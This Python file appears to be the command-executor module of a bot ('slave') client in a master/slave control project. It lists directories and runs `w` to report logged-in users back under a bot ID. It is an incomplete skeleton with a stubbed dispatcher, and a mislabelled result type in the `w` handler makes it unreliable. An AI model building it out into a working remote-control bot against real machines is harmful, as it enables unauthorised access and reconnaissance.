from threading import Thread
import os
import subprocess
from common.data.commands import CommandExecutionRequest, CommandExecutionResult, CommandTypes, CommandStatus
from slave.src.data.context import get_new_commands_arrived_condition, \
    get_commands_from_queue, get_bot_id


def __execute_ls(param: str) -> CommandExecutionResult:
    try:
        files_in_dir = os.listdir(param)
        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param=param,
                                      status=CommandStatus.SUCCESS, results=files_in_dir)
    except FileNotFoundError as e:
        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param=param,
                                      status=CommandStatus.ERROR, results=[e])


def __execute_w() -> CommandExecutionResult:
    result = subprocess.run(["w"], capture_output=True, text=True)
    if result.stderr != "":
        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.W, param="",
                                      status=CommandStatus.ERROR, results=[result.stderr])

    return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.LS, param="",
                                  status=CommandStatus.SUCCESS, results=[result.stdout])





def __execute_command(command: CommandExecutionRequest) -> CommandExecutionResult:
    pass


def __handle_commands() -> None:
    while True:
        with get_new_commands_arrived_condition():
            get_new_commands_arrived_condition().wait()
        command_queue = get_commands_from_queue()
        for command in command_queue:
            print(command)


def start_executor_job() -> Thread:
    thread = Thread(target=__handle_commands)
    thread.start()
    return thread
